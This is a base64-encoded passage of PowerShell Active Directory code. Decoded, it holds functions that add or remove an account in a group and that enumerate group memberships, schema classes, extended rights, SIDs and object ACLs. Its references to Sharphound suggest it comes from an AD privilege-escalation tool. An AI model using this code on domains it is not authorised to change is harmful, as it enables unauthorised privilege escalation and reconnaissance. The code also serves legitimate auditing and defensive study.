RGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dCBgCiAgICAgICAgICAgICAgICAgICAgICAgICdEb21haW4nLCAkKCRnbG9iYWw6bGRhcENvbm5JbmZvLmRvbWFpbikKICAgIH0KICAgIGVsc2UgewogICAgICAgICAgICAkcHJpbmNpcGFsQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgYAogICAgICAgICAgICAgICAgICAgICAgICAnRG9tYWluJywgJCgkZ2xvYmFsOmxkYXBDb25uSW5mby5kb21haW4pLCAkKCRnbG9iYWw6bGRhcENvbm5JbmZvLnVzZXJuYW1lKSwkKCRnbG9iYWw6bGRhcENvbm5JbmZvLnBhc3N3b3JkKQogICAgfQoKICAgICRpZFR5cGUgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LklkZW50aXR5VHlwZV06OkRpc3Rpbmd1aXNoZWROYW1lCiAgICAkZ3JwUHJpbmNpcGFsID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRwcmluY2lwYWxDb250ZXh0LCAkaWRUeXBlLCAkZ3JvdXBETikKCiAgICBpZiAoJGdycFByaW5jaXBhbCAtZXEgJG51bGwpewogICAgICAgIFdyaXRlLUJhZCAiJCgkR3JvdXBETikgbm90IGZvdW5kLiIKICAgIH0gZWxzZXsKCiAgICAgICAgIyBkbyB3ZSBuZWVkIHRvIHJlbW92ZSB0aGUgYWNjb3VudD8KICAgICAgICBpZiAoJFJlbW92ZSkgewogICAgICAgICAgICBbdm9pZF0kZ3JwUHJpbmNpcGFsLk1lbWJlcnMuUmVtb3ZlKCRwcmluY2lwYWxDb250ZXh0LCAkaWRUeXBlLCAkKCRnbG9iYWw6bGRhcENvbm5JbmZvLmRpc3Rpbmd1aXNoZWROYW1lKSkKICAgICAgICB9IGVsc2UgeyAgICAKICAgICAgICAgICAgW3ZvaWRdJGdycFByaW5jaXBhbC5NZW1iZXJzLkFkZCgkcHJpbmNpcGFsQ29udGV4dCwgJGlkVHlwZSwgJCgkZ2xvYmFsOmxkYXBDb25uSW5mby5kaXN0aW5ndWlzaGVkTmFtZSkpCiAgICAgICAgfQogICAgICAgICRncnBQcmluY2lwYWwuU2F2ZSgpICAgIAogICAgICAgIAogICAgICAgIHJldHVybiAnRG9uZScKICAgIH0KCiAgICAjIGNsZWFudXAKICAgICRwcmluY2lwYWxDb250ZXh0LkRpc3Bvc2UoKQoKICAgIGlmICgkZ3JwUHJpbmNpcGFsIC1uZSAkbnVsbCl7CiAgICAgICAgJGdycFByaW5jaXBhbC5EaXNwb3NlKCkKICAgIH0KfQoKIyBHZXRzIGdpdmVuIGF0dHJpYnV0ZSBmb3IgQUQgb2JqZWN0CmZ1bmN0aW9uIEdldC1BdHRyRm9yQURPYmplY3QgKFtzdHJpbmddJG9iamVjdE5hbWUsIFtzdHJpbmdbXV0kcHJvcHMpIHsKICAgIAogICAgJHJlc3VsdCA9IFtzdHJpbmddOjpFbXB0eQoKICAgICMgU2hhcnBob3VuZCByZXR1cm5zIHNBbUFjY291bnRuYW1lIHdpdGggQGRvbWFpbgogICAgJGxkYXBRdWVyeSA9ICIoJihvYmplY3RDbGFzcz11c2VyKSh8KG5hbWU9JG9iamVjdE5hbWUpKHNBTUFjY291bnROYW1lPSRvYmplY3ROYW1lKSh1c2VyUHJpbmNpcGFsTmFtZT0kb2JqZWN0TmFtZSkpKSIKICAgIGlmICgkb2JqZWN0TmFtZS5Ub1N0cmluZygpLkNvbnRhaW5zKCdAJykpIHsKICAgICAgICAkX3VzZXIgPSAkb2JqZWN0TmFtZS5zcGxpdCgnQCcpWzBdCiAgICAgICAgJGxkYXBRdWVyeSA9ICIoJihvYmplY3RDbGFzcz11c2VyKSh8KG5hbWU9JG9iamVjdE5hbWUpKHNBTUFjY291bnROYW1lPSRfdXNlcikoc0FNQWNjb3VudE5hbWU9JG9iamVjdE5hbWUpKHVzZXJQcmluY2lwYWxOYW1lPSRvYmplY3ROYW1lKSkpIgogICAgfQogICAgCiAgICAkZGlyRW50cnkgPSBHZXQtRGlyRW50cnkgLWxkYXBETiAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZwogICAgJGRpclNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJGRpckVudHJ5CiAgICAkZGlyU2VhcmNoZXIuRmlsdGVyID0gJGxkYXBRdWVyeQogICAgW3ZvaWRdJGRpclNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoJHByb3BzKQogICAgJHNSZXN1bHQgPSAkZGlyU2VhcmNoZXIuRmluZE9uZSgpCgogICAgaWYgKCRzUmVzdWx0IC1lcSAkbnVsbCkgewogICAgICAgIHRocm93ICdbR2V0LUF0dHJGb3JBRE9iamVjdF0gVXNlciBub3QgZm91bmQuJwogICAgfQoKICAgICRyZXN1bHQgPSAkc1Jlc3VsdC5Qcm9wZXJ0aWVzCgogICAgIyBjbGVhbnVwCiAgICB0cnkgewogICAgICAgICRkaXJTZWFyY2hlci5EaXNwb3NlKCkKICAgICAgICAkZGlyRW50cnkuRGlzcG9zZSgpCiAgICB9CgogICAgY2F0Y2gge30KCiAgICByZXR1cm4gJHJlc3VsdAoKfQoKIyBHZXQgZGlzdGluZ3Vpc2hlZE5hbWUgZm9yIGFuIEFEIG9iamVjdApmdW5jdGlvbiBHZXQtRGlzdGluZ3Vpc2hlZE5hbWVGb3JPYmplY3QgKFtzdHJpbmddJG9iaikgewogICAgCiAgICAjIFNoYXJwaG91bmQgcmV0dXJucyBzQW1BY2NvdW50bmFtZSB3aXRoIEBkb21haW4KICAgICRsZGFwUXVlcnkgPSAiKCYofChvYmplY3RDbGFzcz1ncm91cCkob2JqZWN0Q2xhc3M9dXNlcikpKHwoc0FNQWNjb3VudE5hbWU9JG9iaikodXNlclByaW5jaXBhbE5hbWU9JG9iaikpKSIKICAgIGlmICgkb2JqLlRvU3RyaW5nKCkuQ29udGFpbnMoJ0AnKSkgewogICAgICAgICRfb2JqID0gJG9iai5zcGxpdCgnQCcpWzBdCiAgICAgICAgJGxkYXBRdWVyeSA9ICIoJih8KG9iamVjdENsYXNzPWdyb3VwKShvYmplY3RDbGFzcz11c2VyKSkofChzQU1BY2NvdW50TmFtZT0kX29iaikoc0FNQWNjb3VudE5hbWU9JG9iaikodXNlclByaW5jaXBhbE5hbWU9JG9iaikpKSIKICAgIH0KCiAgICAkcmVzdWx0ID0gW3N0cmluZ106OkVtcHR5CiAgICAkZGlyRW50cnkgPSBHZXQtRGlyRW50cnkgLWxkYXBETiAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZwogICAgJGRpclNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJGRpckVudHJ5CiAgICAkZGlyU2VhcmNoZXIuRmlsdGVyID0gJGxkYXBRdWVyeQogICAgW3ZvaWRdJGRpclNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCdkaXN0aW5ndWlzaGVkTmFtZScpCiAgICAkc1Jlc3VsdCA9ICRkaXJTZWFyY2hlci5GaW5kT25lKCkKCiAgICBpZiAoJHNSZXN1bHQgLWVxICRudWxsKSB7CiAgICAgICAgdGhyb3cgJ1tHZXQtRGlzdGluZ3Vpc2hlZE5hbWVGb3JPYmplY3RdIFVzZXIgbm90IGZvdW5kLicKICAgIH0KCiAgICAkcmVzdWx0ID0gJHNSZXN1bHQuUHJvcGVydGllc1snZGlzdGluZ3Vpc2hlZE5hbWUnXVswXQoKICAgICMgY2xlYW51cAogICAgJGRpclNlYXJjaGVyLkRpc3Bvc2UoKQogICAgJGRpckVudHJ5LkRpc3Bvc2UoKQoKICAgIHJldHVybiAkcmVzdWx0Cn0KCiMgR2V0IGdyb3VwbWVtYmVyc2hpcCBmb3Igc3VwcGxpZWQgdXNlcgpmdW5jdGlvbiBHZXQtR3JvdXBNZW1iZXJzaGlwKFtzdHJpbmddJG9iak5hbWUsIFtib29sXSRyZWN1cnNpdmUgPSAkdHJ1ZSkgewogICAgCiAgICAkcmVzdWx0cyA9IEAoKQoKICAgICMgR2V0IEROIGZvciB1c2VyCiAgICAkZGlyRW50cnkgPSBHZXQtRGlyRW50cnkgLWxkYXBETiAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZwogICAgJE9iakROID0gR2V0LURpc3Rpbmd1aXNoZWROYW1lRm9yT2JqZWN0IC1vYmogJG9iak5hbWUKCiAgICAjIFVzZSBjdXN0b20gT0lEIChMREFQX01BVENISU5HX1JVTEVfSU5fQ0hBSU4pIGZvciBmaW5kaW5nIGdyb3VwcyB0aGF0IHRoaXMgdXNlciBpcyBhIChpbilkaXJlY3QgbWVtYmVyIG9mCiAgICAjIFNlYXJjaCBmcm9tIHRvcCBvZiB0aGUgZG9tYWluCiAgICAkZG9tYWluRGlyRW50cnkgPSBHZXQtRG9tYWluRGlyRW50cnkgLWRpckVudHJ5ICRkaXJFbnRyeQoKICAgICMgTWFrZSB0aGUgc2VhY2ggcmVjdXJzaXZlLCBvciBub3QuCiAgICBbc3RyaW5nXSRsZGFwRmlsdGVyID0gW3N0cmluZ106OkVtcHR5CiAgICBpZiAoJHJlY3Vyc2l2ZSkgewogICAgICAgICRsZGFwRmlsdGVyID0gIihtZW1iZXI6MS4yLjg0MC4xMTM1NTYuMS40LjE5NDE6PSRPYmpETikiCiAgICB9IGVsc2UgewogICAgICAgICRsZGFwRmlsdGVyID0gIihtZW1iZXI9JE9iakROKSIKICAgIH0KCiAgICAkZGlyU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkZG9tYWluRGlyRW50cnkgICAgICAKICAgICRkaXJTZWFyY2hlci5GaWx0ZXIgPSAkbGRhcEZpbHRlcgogICAgJGRpclNlYXJjaGVyLlBhZ2VTaXplID0gMTAwMAogICAgJGRpclNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiICAgIAoKICAgICRzUmVzdWx0cyA9ICRkaXJTZWFyY2hlci5GaW5kQWxsKCkKCiAgICBpZiAoJHNSZXN1bHRzIC1lcSAkbnVsbCkgewogICAgICAgIHRocm93ICdbR2V0LUdyb3VwbWVtYmVyc2hpcF0gVXNlciBub3QgZm91bmQuJwogICAgfQoKICAgICRzUmVzdWx0cyB8IEZvckVhY2gtT2JqZWN0IHsgIAogICAgICAgICRyZXN1bHRzICs9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICAgICdncm91cEROJyAgID0gJF8uUHJvcGVydGllc1snZGlzdGluZ3Vpc2hlZE5hbWUnXVswXQogICAgICAgICAgICAnTlRBY2NvdW50JyA9ICRfLlByb3BlcnRpZXNbJ3NBTUFjY291bnROYW1lJ11bMF0KICAgICAgICB9ICAgICAgICAgICAgICAgCiAgICB9CgogICAgIyBjbGVhbnVwCiAgICAkZGlyRW50cnkuRGlzcG9zZSgpCiAgICAkZG9tYWluRGlyRW50cnkuRGlzcG9zZSgpCiAgICAkZGlyU2VhcmNoZXIuRGlzcG9zZSgpCgogICAgcmV0dXJuICRyZXN1bHRzCn0KCiMgR2V0cyBncm91cG1lbWJlcnNoaXAgb2Ygb2JqZWN0CmZ1bmN0aW9uIEdldC1Hcm91cE1lbWJlciAoW3N0cmluZ10kb2JqZWN0TmFtZSl7CiAgICAKICAgICRyZXN1bHRzID0gQCgpCgogICAgIyBHZXQgRE4gZm9yIHVzZXIKICAgICRkaXJFbnRyeSA9IEdldC1EaXJFbnRyeSAtbGRhcEROICRnbG9iYWw6bGRhcENvbm5JbmZvLkxEQVBDb25uU3RyaW5nCiAgICAkT2JqRE4gPSBHZXQtRGlzdGluZ3Vpc2hlZE5hbWVGb3JPYmplY3QgLW9iaiAkb2JqZWN0TmFtZSAKCiAgICAjIFVzZSBjdXN0b20gT0lEIChMREFQX01BVENISU5HX1JVTEVfSU5fQ0hBSU4pIGZvciBmaW5kaW5nIGdyb3VwcyB0aGF0IHRoaXMgdXNlciBpcyBhIChpbilkaXJlY3QgbWVtYmVyIG9mCiAgICAjIFNlYXJjaCBmcm9tIHRvcCBvZiB0aGUgZG9tYWluCiAgICAkZG9tYWluRGlyRW50cnkgPSBHZXQtRG9tYWluRGlyRW50cnkgLWRpckVudHJ5ICRkaXJFbnRyeQoKICAgICRkaXJTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRkb21haW5EaXJFbnRyeSAgICAgIAogICAgJGRpclNlYXJjaGVyLkZpbHRlciA9ICIobWVtYmVyT2Y6MS4yLjg0MC4xMTM1NTYuMS40LjE5NDE6PSRPYmpETikiCiAgICAkZGlyU2VhcmNoZXIuUGFnZVNpemUgPSAxMDAwCiAgICAkZGlyU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIgICAgCgogICAgJHNSZXN1bHRzID0gJGRpclNlYXJjaGVyLkZpbmRBbGwoKQoKICAgIGlmICgkc1Jlc3VsdHMgLWVxICRudWxsKSB7CiAgICAgICAgdGhyb3cgJ1tHZXQtR3JvdXBtZW1iZXJdIFVzZXIvT2JqZWN0IG5vdCBmb3VuZC4nCiAgICB9CgogICAgJHNSZXN1bHRzIHwgRm9yRWFjaC1PYmplY3QgeyAgCiAgICAgICAgJHJlc3VsdHMgKz0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgJ2dyb3VwRE4nICAgPSAkXy5Qcm9wZXJ0aWVzWydkaXN0aW5ndWlzaGVkTmFtZSddWzBdCiAgICAgICAgICAgICdOVEFjY291bnQnID0gJF8uUHJvcGVydGllc1snc0FNQWNjb3VudE5hbWUnXVswXQogICAgICAgIH0gICAgICAgICAgICAgICAKICAgIH0KCiAgICAjIGNsZWFudXAKICAgICRkaXJFbnRyeS5EaXNwb3NlKCkKICAgICRkb21haW5EaXJFbnRyeS5EaXNwb3NlKCkKICAgICRkaXJTZWFyY2hlci5EaXNwb3NlKCkKICAgIAogICAgcmV0dXJuICRyZXN1bHRzCgp9CgojIEdldC1Eb21haW5EaXJFbnRyeQpmdW5jdGlvbiBHZXQtRG9tYWluRGlyRW50cnkgewogICAgICAgCiAgICAkZGlyRW50cnkgPSBHZXQtRGlyRW50cnkgLWxkYXBETiAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZwogICAgJGRpclNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJGRpckVudHJ5CiAgICAkZGlyU2VhcmNoZXIuRmlsdGVyID0gIigmKG9iamVjdENsYXNzPWRvbWFpbikpIgoKICAgICRzUmVzdWx0ID0gJGRpclNlYXJjaGVyLkZpbmRPbmUoKQoKICAgIGlmICgkc1Jlc3VsdCAtZXEgJG51bGwpIHsKICAgICAgICB0aHJvdyAnW0dldC1Eb21haW5EaXJFbnRyeV0gRG9tYWluIG5vdCBmb3VuZC4nCiAgICB9CgogICAgJGRvbWFpbkRpckVudHJ5ID0gJHNSZXN1bHQuR2V0RGlyZWN0b3J5RW50cnkoKQoKICAgICMgY2xlYW51cAogICAgJGRpckVudHJ5LkRpc3Bvc2UoKQogICAgJGRpclNlYXJjaGVyLkRpc3Bvc2UoKQogICAgCiAgICByZXR1cm4gJGRvbWFpbkRpckVudHJ5ICAgIAp9CgojIEdldC1Eb21haW5ETgpmdW5jdGlvbiBHZXQtRG9tYWluRE4gewogICAgICAgCiAgICAkZGlyRW50cnkgPSBHZXQtRGlyRW50cnkgLWxkYXBETiAkZ2xvYmFsOmxkYXBDb25uSW5mby5MREFQQ29ublN0cmluZwogICAgJGRpclNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJGRpckVudHJ5CiAgICAkZGlyU2VhcmNoZXIuRmlsdGVyID0gIigmKG9iamVjdENsYXNzPWRvbWFpbikpIgoKICAgICRzUmVzdWx0ID0gJGRpclNlYXJjaGVyLkZpbmRPbmUoKQoKICAgIGlmICgkc1Jlc3VsdCAtZXEgJG51bGwpIHsKICAgICAgICB0aHJvdyAnW0dldC1Eb21haW5ETl0gRG9tYWluIG5vdCBmb3VuZC4nCiAgICB9CgogICAgJGRvbWFpbkRpckVudHJ5ID0gJHNSZXN1bHQuUGF0aAogICAgJGRpckVudHJ5LkRpc3Bvc2UoKQogICAgJGRpclNlYXJjaGVyLkRpc3Bvc2UoKQogICAgCiAgICByZXR1cm4gJGRvbWFpbkRpckVudHJ5ICAgIAp9CgojIEdldCBTY2hlbWEgYW5kIGNvbmZpZyBETgpmdW5jdGlvbiBHZXQtU2NoZW1hQW5kQ29uZmlnQ29udGV4dCB7CgogICAgJGRpckVudHJ5ID0gR2V0LURpckVudHJ5ICJMREFQOi8vJCgkZ2xvYmFsOkFESW5mby5wcmltYXJ5REMpL1Jvb3REU0UiICAgICAgICAKICAgICRzY2hlbWFDb250ZXh0ID0gJGRpckVudHJ5LnNjaGVtYU5hbWluZ0NvbnRleHQKICAgICRjb25maWdDb250ZXh0ID0gJGRpckVudHJ5LmNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0CiAgICAKICAgICRnbG9iYWw6QURJbmZvLkNvbmZpZ3VyYXRpb25OYW1pbmdDb250ZXh0ID0gJGNvbmZpZ0NvbnRleHRbMF0KICAgICRnbG9iYWw6QURJbmZvLnNjaGVtYU5hbWluZ0NvbnRleHQgPSAkc2NoZW1hQ29udGV4dFswXQoKICAgICNjbGVhbnVwCiAgICAkZGlyRW50cnkuRGlzcG9zZSgpICAgICAgIAp9CgojIEdldCBjbGFzc2VzIGZyb20gc2NoZW1hCmZ1bmN0aW9uIEdldC1TY2hlbWFDbGFzc2VzIHsKICAgICAgICAKICAgICMgV2UgbmVlZCB0aGUgc2NoZW1hY29udGV4dCBmb3IgdGhpcyBvbmUgICAgCiAgICAkc2NoZW1hRGlyRW50cnkgPSBHZXQtRGlyRW50cnkgIiQoJGdsb2JhbDpsZGFwQ29ubkluZm8ucHJvdG9jb2wpOi8vJCgkZ2xvYmFsOkFESW5mby5wcmltYXJ5REMpLyQoJGdsb2JhbDpBREluZm8uc2NoZW1hTmFtaW5nQ29udGV4dCkiCiAgICAKICAgICRkaXJTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRzY2hlbWFEaXJFbnRyeQogICAgJGRpclNlYXJjaGVyLkZpbHRlciA9ICIoc2NoZW1hSURHVUlEPSopIgogICAgJGRpclNlYXJjaGVyLlBhZ2VTaXplID0gMTAwMDAwMDAKICAgIFt2b2lkXSRkaXJTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgnbGRhcERpc3BsYXlOYW1lJykKICAgIFt2b2lkXSRkaXJTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgnc2NoZW1hSURHVUlEJykKCiAgICAkc1Jlc3VsdCA9ICRkaXJTZWFyY2hlci5GaW5kQWxsKCkKCiAgICBpZiAoJHNSZXN1bHQgLWVxICRudWxsKSB7CiAgICAgICAgdGhyb3cgJ1tHZXQtU2NoZW1hQ2xhc3Nlc10gTm8gU2NoZW1hQ2xhc3NlcyBub3QgZm91bmQuJwogICAgfQoKICAgICMkcmVzdWx0cyA9IEAoKQogICAgJHJlc3VsdHMgPSBAe30KICAgIGZvcmVhY2ggKCRyIGluICRzUmVzdWx0KSB7CiAgICAgICAgJHJlc3VsdHNbJHIuUHJvcGVydGllc1snbGRhcERpc3BsYXlOYW1lJ11bMF1dID0gW2d1aWRdJHIuUHJvcGVydGllc1snc2NoZW1haWRndWlkJ11bMF0KICAgIH0KICAgCiAgICAjY2xlYW51cAogICAgJHNjaGVtYURpckVudHJ5LkRpc3Bvc2UoKQogICAgJGRpclNlYXJjaGVyLkRpc3Bvc2UoKQoKICAgICMgQWRkIHNvbWUgc3RhdGljIGd1aWRzCiAgICAjIHJlZjogaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9mZjQwNjI2MC5hc3B4CiAgICAkY29uc3RHVUlEID0gQCgpCiAgICAkY29uc3ROYW1lID0gQCgpCgogICAgJGNvbnN0R1VJRCArPSAnNzJlMzk1NDctN2IxOC0xMWQxLWFkZWYtMDBjMDRmZDhkNWNkJwogICAgJGNvbnN0R1VJRCArPSAnYjgxMTlmZDAtMDRmNi00NzYyLWFiN2EtNDk4NmM3NmIzZjlhJwogICAgJGNvbnN0R1VJRCArPSAnYzc0MDczNjAtMjBiZi0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5JwogICAgJGNvbnN0R1VJRCArPSAnZTQ1Nzk1YjItOTQ1NS0xMWQxLWFlYmQtMDAwMGY4MDM2N2MxJwogICAgJGNvbnN0R1VJRCArPSAnNTliYTJmNDItNzlhMi0xMWQwLTkwMjAtMDBjMDRmYzJkM2NmJwogICAgJGNvbnN0R1VJRCArPSAnYmMwYWMyNDAtNzlhOS0xMWQwLTkwMjAtMDBjMDRmYzJkNGNmJwogICAgJGNvbnN0R1VJRCArPSAnNzdiNWI4ODYtOTQ0YS0xMWQxLWFlYmQtMDAwMGY4MDM2N2MxJwogICAgJGNvbnN0R1VJRCArPSAnZTQ4ZDAxNTQtYmNmOC0xMWQxLTg3MDItMDBjMDRmYjk2MDUwJwogICAgJGNvbnN0R1VJRCArPSAnNGMxNjQyMDAtMjBjMC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5JwogICAgJGNvbnN0R1VJRCArPSAnNWYyMDIwMTAtNzlhNS0xMWQwLTkwMjAtMDBjMDRmYzJkNGNmJwogICAgJGNvbnN0R1VJRCArPSAnZTQ1Nzk1YjMtOTQ1NS0xMWQxLWFlYmQtMDAwMGY4MDM2N2MxJwoKICAgICRjb25zdE5hbWUgKz0gJ0ROUyBIb3N0IE5hbWUgQXR0cmlidXRlcycKICAgICRjb25zdE5hbWUgKz0gJ090aGVyIERvbWFpbiBQYXJhbWV0ZXJzJwogICAgJGNvbnN0TmFtZSArPSAnRG9tYWluIFBhc3N3b3JkIGFuZCBMb2Nrb3V0IFBvbGljaWVzJwogICAgJGNvbnN0TmFtZSArPSAnUGhvbmUgYW5kIE1haWwgT3B0aW9ucycKICAgICRjb25zdE5hbWUgKz0gJ0dlbmVyYWwgSW5mb3JtYXRpb24nCiAgICAkY29uc3ROYW1lICs9ICdHcm91cCBNZW1iZXJzaGlwJwogICAgJGNvbnN0TmFtZSArPSAnUGVyc29uYWwgSW5mb3JtYXRpb24nCiAgICAkY29uc3ROYW1lICs9ICdQdWJsaWMgSW5mb3JtYXRpb24nCiAgICAkY29uc3ROYW1lICs9ICdBY2NvdW50IFJlc3RyaWN0aW9ucycKICAgICRjb25zdE5hbWUgKz0gJ0xvZ29uIEluZm9ybWF0aW9uJwogICAgJGNvbnN0TmFtZSArPSAnV2ViIEluZm9ybWF0aW9uJwoKICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGNvbnN0TmFtZS5MZW5ndGg7ICRpKyspIHsKICAgICAgICA8IyRyZXN1bHRzICs9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICAgICdMREFQUGF0aCcgICAgICAgID0gW3N0cmluZ106OkVtcHR5CiAgICAgICAgICAgICdzY2hlbWFJZEd1aWQnICAgID0gJGNvbnN0R1VJRFskaV0KICAgICAgICAgICAgJ2xkYXBEaXNwbGF5TmFtZScgPSAkY29uc3ROYW1lWyRpXQogICAgICAgIH0jPgogICAgICAgICRyZXN1bHRzWyRjb25zdE5hbWVbJGldXSA9ICRjb25zdEdVSURbJGldCiAgICB9CgoKICAgIHJldHVybiAkcmVzdWx0cwp9CgojIEdldCBhbGwgbmFtZXMgYW5kIEdVSURzIG9mIGV4dGVuZGVkIHJpZ2h0cwpmdW5jdGlvbiBHZXQtRXh0ZW5kZWRSaWdodHMgewogICAgCiAgICAjIFdlIG5lZWQgdGhlIGNvbmZpZ3VyYXRpb25jb250ZXh0IGZvciB0aGlzIG9uZQogICAgCiAgICAkY29uZmlnRGlyRW50cnkgPSBHZXQtRGlyRW50cnkgIiQoJGdsb2JhbDpsZGFwQ29ubkluZm8ucHJvdG9jb2wpOi8vJCgkZ2xvYmFsOkFESW5mby5wcmltYXJ5REMpLyQoJGdsb2JhbDpBREluZm8uQ29uZmlndXJhdGlvbk5hbWluZ0NvbnRleHQpIiAgICAKICAgICRkaXJTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRjb25maWdEaXJFbnRyeQogICAgJGRpclNlYXJjaGVyLlBhZ2VTaXplID0gMTAwMDAwMDAKICAgICRkaXJTZWFyY2hlci5GaWx0ZXIgPSAiKCYob2JqZWN0Q2xhc3M9Y29udHJvbEFjY2Vzc1JpZ2h0KShyaWdodHNHVUlEPSopKSIKCiAgICBbdm9pZF0kZGlyU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoJ2Rpc3BsYXlOYW1lJykKICAgIFt2b2lkXSRkaXJTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgncmlnaHRzR1VJRCcpCgogICAgJHNSZXN1bHQgPSAkZGlyU2VhcmNoZXIuRmluZEFsbCgpCgogICAgJHJlc3VsdHMgPSBAKCkKICAgIGZvcmVhY2ggKCRyIGluICRzUmVzdWx0KSB7CiAgICAgICAgJHJlc3VsdHMgKz0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgJ3NjaGVtYUlkR3VpZCcgICAgPSBbZ3VpZF0kci5Qcm9wZXJ0aWVzWydyaWdodHNHVUlEJ11bMF0KICAgICAgICAgICAgJ2xkYXBEaXNwbGF5TmFtZScgPSAkci5Qcm9wZXJ0aWVzWydkaXNwbGF5TmFtZSddWzBdCiAgICAgICAgICAgICdMREFQUGF0aCcgICAgICAgID0gJHIuUHJvcGVydGllc1snYWRzcGF0aCddWzBdCiAgICAgICAgfQogICAgfQoKICAgICMgY2xlYW51cAogICAgJGNvbmZpZ0RpckVudHJ5LkRpc3Bvc2UoKQogICAgJGRpclNlYXJjaGVyLkRpc3Bvc2UoKQoKICAgIHJldHVybiAkcmVzdWx0cwp9CgojIFJldHVybnMgdGhlIHZhbHVlIG9mIGEgd2VsbCBrbm93biBTSUQgb3IgdGhlIGFscmVhZHkgZm91bmQgTlRBY2NvdW50IG5hbWUKZnVuY3Rpb24gVHJhbnNsYXRlLUlkZW50aXR5UmVmZXJlbmNlICgkcmVmZXJlbmNlLCBbYm9vbF0kcmVzb2x2ZSkgewogICAgCiAgICAkcmVzdWx0ID0gW3N0cmluZ106OkVtcHR5CiAgICAKCiAgICAkcmVzdWx0ID0gJGdsb2JhbDpkaWNLbm93blNpZHNbJHJlZmVyZW5jZV0KCiAgICBpZiAoJHJlc3VsdCAtZXEgJG51bGwpIHsKICAgICAgICAKICAgICAgICAjIERvIHdlIG5lZWQgdG8gcmVzb2x2ZT8KICAgICAgICBpZiAoJHJlc29sdmUpIHsKICAgICAgICAgICAgJHQgPSBHZXQtRGlyRW50cnkgIiQoJGdsb2JhbDpsZGFwQ29ubkluZm8ucHJvdG9jb2wpOi8vJCgkZ2xvYmFsOkFESW5mby5wcmltYXJ5REMpLzxTSUQ9JHJlZmVyZW5jZT4iCgogICAgICAgICAgICAkZm91bmRSZWYgPSAkdC5OYW1lCiAgICAgICAgICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkZm91bmRSZWYpKSB7CiAgICAgICAgICAgICAgICAjIE5vIG5hbWUgZm91bmQuIHJldHVybiAkcmVmZXJlbmNlCiAgICAgICAgICAgICAgICAkZm91bmRSZWYgPSAkcmVmZXJlbmNlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyBBZGQgdG8gb3VyIGRpY3Rpb25hcnkKICAgICAgICAgICAgICAgICRnbG9iYWw6ZGljS25vd25TaWRzWyRyZWZlcmVuY2VdID0gJHQuTmFtZS5WYWx1ZQogICAgICAgICAgICB9CgogICAgICAgICAgICAkcmVmZXJlbmNlID0gJGZvdW5kUmVmCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRyZXN1bHQgPSAkcmVmZXJlbmNlCiAgICB9CgogICAgcmV0dXJuICRyZXN1bHQKfQoKIyBSZXRyaWV2ZSBBQ0wgb2YgZ2l2ZW4gbGRhcCBvYmplY3QKZnVuY3Rpb24gR2V0LUFET2JqZWN0QUNMICgkb2JqZWN0RE4pIHsKCiAgICAjIENoZWNrIGlmIHdlIG